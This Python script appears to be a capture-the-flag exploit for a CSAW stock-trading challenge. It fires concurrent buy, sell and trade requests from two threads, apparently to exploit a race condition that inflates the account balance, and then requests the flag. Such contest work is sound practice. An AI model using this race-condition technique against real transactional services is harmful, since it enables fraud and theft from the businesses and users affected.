import requests
import json
from threading import Thread
from time import sleep
import multiprocessing

ADDRESS = "http://127.0.0.1"
PORT = 4657
# ADDRESS = "http://stonk.csaw.io"
# PORT = 4662


def sendGET(subpath) -> str:
    try:
        response = requests.get(ADDRESS + ":" + str(PORT) + subpath)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def sendPOST(subpath, data) -> str:
    url = ADDRESS + ":" + str(PORT) + subpath
    payload = data

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def buyStock(key, str):
    body = sendPOST("/buy", {"key": key, "stock": str})
    return body


def sellStock(key, str):
    body = sendPOST("/sell", {"key": key, "stock": str})
    return body


def tradeStock(key, str, str1):
    body = sendPOST("/trade", {"key": key, "stock": str, "stock1": str1})
    return body


def listCalls() -> str:
    body = sendGET("/listCalls")
    out = json.loads(body)
    return "\n".join((str(i["name"]) + " at " + str(i["price"]) for i in out.values()))


def flag(key) -> str:
    body = sendPOST("/flag", {"key": key})
    return body


def status(key) -> str:
    body = sendPOST("/login", {"key": key})
    return body


def buyandsell(key, s):
    global cnt_2
    cnt_2 = 0
    while cnt_2 < 100:
        buyStock(key, s)
        sellStock(key, s)
        cnt_2 += 1
        stat = status(key)
        print(stat)
        stat = json.loads(stat)
        print("You have", stat["balance"], "dollars\n")


def trade(key, s1, s2):
    global cnt_1
    cnt_1 = 0
    while cnt_1 < 150:
        tradeStock(key, s1, s2)
        cnt_1 += 1
        stat = status(key)
        print(stat)
        stat = json.loads(stat)
        print("You have", stat["balance"], "dollars\n")


key = "something_random"
s0 = "AAPLISH"
s1 = "SNAPSTAR"
s2 = "BROOKING"

cnt1 = cnt2 = 0

if __name__ == "__main__":
    stat = status(key)
    print(stat)
    stat = json.loads(stat)
    print("You have", stat["balance"], "dollars\n")

    buyStock(key, s0)
    buyStock(key, s1)
    buyStock(key, s1)
    buyStock(key, s1)

    stat = status(key)
    print(stat)
    stat = json.loads(stat)
    print("You have", stat["balance"], "dollars\n")

    thread1 = Thread(target=buyandsell, args=(key, s0))
    thread2 = Thread(target=trade, args=(key, s1, s2))

    thread1.start()
    thread2.start()

    while cnt_1 < 100 or cnt_2 < 100:
        sleep(1)

    thread1.join()
    thread2.join()

    while thread1.is_alive() or thread2.is_alive():
        sleep(1)

    stat = status(key)
    print(stat)
    stat = json.loads(stat)
    print("You have", stat["balance"], "dollars\n")

    stat = status(key)
    print(stat)
    stat = json.loads(stat)
    print("You have", stat["balance"], "dollars\n")

    while stat[s1] > 0:
        print("selling now")
        sellStock(key, s1)
        stat = status(key)
        print(stat)
        stat = json.loads(stat)
        print("You have", stat["balance"], "dollars\n")
        if stat["balance"] > 9000:
            break

    print(flag(key))
